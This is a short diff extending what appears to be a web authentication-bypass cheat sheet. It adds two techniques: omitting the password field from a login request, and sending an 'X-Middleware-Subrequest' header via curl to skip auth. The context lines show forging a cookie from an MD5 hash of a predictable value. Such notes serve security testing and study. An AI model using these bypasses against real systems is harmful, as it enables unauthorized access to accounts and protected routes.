@@ -15,3 +15,14 @@ Forgeable session/role cookie — if a cookie is just a hash of a predictable pl
 echo -n "true" | md5sum
 # set cookie to the resulting hash
 ```
+
+Missing-parameter bypass — delete the password field from a login request entirely rather than guessing one; some backends treat an absent field as "no check" rather than "fail":
+```bash
+# normal: {"username":"admin","password":"x"}
+# try:    {"username":"admin"}
+```
+
+Trusted-internal-header bypass — some apps/frameworks treat a specific header as proof of internal routing (e.g. a reverse-proxy or middleware marker) and skip auth entirely when it's present. Worth trying blind on any app with a known framework fingerprint:
+```bash
+curl -H "X-Middleware-Subrequest: middleware" <protected-route>
+```
